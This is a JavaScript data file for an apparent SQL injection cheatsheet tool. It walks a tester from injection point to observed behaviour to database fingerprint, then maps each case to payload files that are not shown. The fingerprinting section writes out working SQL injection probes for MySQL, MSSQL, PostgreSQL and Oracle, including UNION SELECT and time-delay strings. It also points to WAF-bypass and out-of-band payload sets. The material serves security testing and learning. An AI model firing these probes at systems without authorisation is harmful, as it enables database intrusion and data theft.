/* ============================================================
   sqli://cheatsheet — data.js
   Context-first, guided sequential tree.
   User never has to know technique or DB upfront.

   Node shape:
   {
     id       : unique string
     label    : display text
     hint     : newcomer hint (optional)
     lane     : 'neutral' | 'error' | 'bool' | 'time' | 'oob'
     type     : 'root' | 'detection' | 'observe' | 'fingerprint' | 'leaf'
     payload  : path to payload .txt file (on leaf/detection/fingerprint nodes)
     psRef    : PortSwigger URL (optional)
     children : []
   }
   ============================================================ */

const INJECTION_POINTS = [
  {
    id: "get",
    label: "GET parameter",
    hint: "Value in URL query string — e.g. ?id=1&name=foo",
  },
  {
    id: "post",
    label: "POST body",
    hint: "application/x-www-form-urlencoded or multipart form data",
  },
  {
    id: "header",
    label: "HTTP header",
    hint: "User-Agent, Referer, X-Forwarded-For, Accept-Language, etc.",
  },
  {
    id: "cookie",
    label: "Cookie",
    hint: "Any cookie value sent in the Cookie: header",
  },
  {
    id: "json",
    label: "JSON / XML body",
    hint: 'Value inside a JSON or XML request body — e.g. {"id":"1"}',
  },
];

/* ── OBSERVE OPTIONS ─────────────────────────────────────────
   After detection payloads, user picks what they observed.
   These map to technique lanes.
*/
const OBSERVE_OPTIONS = [
  {
    id: "error",
    label: "Got a database error",
    hint: 'SQL syntax error or DB exception visible in the response body — e.g. "You have an error in your SQL syntax", "ORA-", "Unclosed quotation mark"',
    lane: "error",
    icon: "⚠",
  },
  {
    id: "response",
    label: "Response changed",
    hint: "Two different payloads (true vs false condition) gave noticeably different responses — different content, length, or elements",
    lane: "bool",
    icon: "⇄",
  },
  {
    id: "timing",
    label: "Response was delayed",
    hint: "Response took significantly longer when using SLEEP/WAITFOR/PG_SLEEP payload — time-based blind SQLi",
    lane: "time",
    icon: "◷",
  },
  {
    id: "nothing",
    label: "Nothing changed",
    hint: "No error, no response difference, no delay — try OOB techniques using DNS/HTTP callback (Burp Collaborator, interactsh)",
    lane: "oob",
    icon: "◎",
  },
];

/* ── DB OPTIONS ──────────────────────────────────────────────
   After fingerprinting, user picks which DB they confirmed.
*/
const DB_OPTIONS = [
  {
    id: "mysql",
    label: "MySQL / MariaDB",
    fingerprint: {
      queries: [
        "' AND SLEEP(0)--",
        "' AND @@version--",
        "' UNION SELECT @@version--",
        "' AND 'a' LIKE 'a'--",
      ],
      indicators: [
        'Error contains: "You have an error in your SQL syntax"',
        '@@version returns value containing "MySQL" or "MariaDB"',
        "Supports # as comment: '#",
        "SLEEP() function works",
      ],
    },
  },
  {
    id: "mssql",
    label: "Microsoft SQL Server",
    fingerprint: {
      queries: [
        "'; WAITFOR DELAY '0:0:0'--",
        "' AND 1=CONVERT(int,@@version)--",
        "' UNION SELECT @@version--",
        "' AND 'a'+'b'='ab'--",
      ],
      indicators: [
        'Error contains: "Unclosed quotation mark" or "Incorrect syntax"',
        '@@version contains "Microsoft SQL Server"',
        "WAITFOR DELAY works for timing",
        "String concat uses + operator",
      ],
    },
  },
  {
    id: "postgresql",
    label: "PostgreSQL",
    fingerprint: {
      queries: [
        "' AND PG_SLEEP(0)--",
        "' AND version()--",
        "' UNION SELECT version()--",
        "' AND 'a'||'b'='ab'--",
      ],
      indicators: [
        'Error contains: "unterminated quoted string" or "syntax error at"',
        'version() returns value containing "PostgreSQL"',
        "PG_SLEEP() works for timing",
        "String concat uses || operator",
      ],
    },
  },
  {
    id: "oracle",
    label: "Oracle",
    fingerprint: {
      queries: [
        "' AND 1=1 FROM DUAL--",
        "' UNION SELECT NULL FROM DUAL--",
        "' UNION SELECT banner FROM v$version WHERE ROWNUM=1--",
        "' AND 'a'||'b'='ab'--",
      ],
      indicators: [
        'Error contains: "ORA-" prefix',
        "Requires FROM clause — FROM DUAL works",
        "v$version table exists",
        "String concat uses || operator",
      ],
    },
  },
  {
    id: "generic",
    label: "Unknown / Generic",
    fingerprint: {
      queries: ["' OR '1'='1", "' AND '1'='1'--", "1 AND 1=1--", "1 AND 1=2--"],
      indicators: [
        "DB type unclear from errors",
        "Use generic payloads to probe further",
        "Try DB-specific syntax one at a time",
        "Check error messages for DB name/version hints",
      ],
    },
  },
];

/* ── PAYLOAD MAP ─────────────────────────────────────────────
   Maps observe_id + db_id → payload file path
   observe: error | response | timing | nothing
   db: mysql | mssql | postgresql | oracle | generic
*/
const PAYLOAD_MAP = {
  error: {
    mysql: {
      file: "payloads/mysql/error.txt",
      psRef: "https://portswigger.net/web-security/sql-injection/cheat-sheet",
    },
    mssql: {
      file: "payloads/mssql/error.txt",
      psRef: "https://portswigger.net/web-security/sql-injection/cheat-sheet",
    },
    postgresql: {
      file: "payloads/postgresql/error.txt",
      psRef: "https://portswigger.net/web-security/sql-injection/cheat-sheet",
    },
    oracle: {
      file: "payloads/oracle/error.txt",
      psRef: "https://portswigger.net/web-security/sql-injection/cheat-sheet",
    },
    generic: { file: "payloads/generic/boolean.txt" },
  },
  response: {
    mysql: {
      file: "payloads/mysql/boolean.txt",
      psRef: "https://portswigger.net/web-security/sql-injection/blind",
    },
    mssql: {
      file: "payloads/mssql/boolean.txt",
      psRef: "https://portswigger.net/web-security/sql-injection/blind",
    },
    postgresql: {
      file: "payloads/postgresql/boolean.txt",
      psRef: "https://portswigger.net/web-security/sql-injection/blind",
    },
    oracle: {
      file: "payloads/oracle/boolean.txt",
      psRef: "https://portswigger.net/web-security/sql-injection/blind",
    },
    generic: { file: "payloads/generic/boolean.txt" },
  },
  timing: {
    mysql: {
      file: "payloads/mysql/time.txt",
      psRef: "https://portswigger.net/web-security/sql-injection/blind",
    },
    mssql: {
      file: "payloads/mssql/time.txt",
      psRef: "https://portswigger.net/web-security/sql-injection/blind",
    },
    postgresql: {
      file: "payloads/postgresql/time.txt",
      psRef: "https://portswigger.net/web-security/sql-injection/blind",
    },
    oracle: {
      file: "payloads/oracle/time.txt",
      psRef: "https://portswigger.net/web-security/sql-injection/blind",
    },
    generic: { file: "payloads/generic/detection.txt" },
  },
  nothing: {
    mysql: {
      file: "payloads/mysql/oob.txt",
      psRef: "https://portswigger.net/web-security/sql-injection/blind",
    },
    mssql: {
      file: "payloads/mssql/oob.txt",
      psRef: "https://portswigger.net/web-security/sql-injection/blind",
    },
    postgresql: {
      file: "payloads/postgresql/oob.txt",
      psRef: "https://portswigger.net/web-security/sql-injection/blind",
    },
    oracle: {
      file: "payloads/oracle/oob.txt",
      psRef: "https://portswigger.net/web-security/sql-injection/blind",
    },
    generic: { file: "payloads/generic/detection.txt" },
  },
};

/* ── UNION PAYLOADS ──────────────────────────────────────────
   Available as a second tab on error-based leaf nodes
   since error-visible also unlocks union-based
*/
const UNION_PAYLOAD_MAP = {
  mysql: {
    file: "payloads/mysql/union.txt",
    psRef: "https://portswigger.net/web-security/sql-injection/union-attacks",
  },
  mssql: {
    file: "payloads/mssql/union.txt",
    psRef: "https://portswigger.net/web-security/sql-injection/union-attacks",
  },
  postgresql: {
    file: "payloads/postgresql/union.txt",
    psRef: "https://portswigger.net/web-security/sql-injection/union-attacks",
  },
  oracle: {
    file: "payloads/oracle/union.txt",
    psRef: "https://portswigger.net/web-security/sql-injection/union-attacks",
  },
};

const WAF_PAYLOADS = { file: "payloads/waf/bypass.txt" };
const DETECTION_PAYLOADS = { file: "payloads/detection.txt" };
const FINGERPRINT_PAYLOADS = { file: "payloads/fingerprint.txt" };
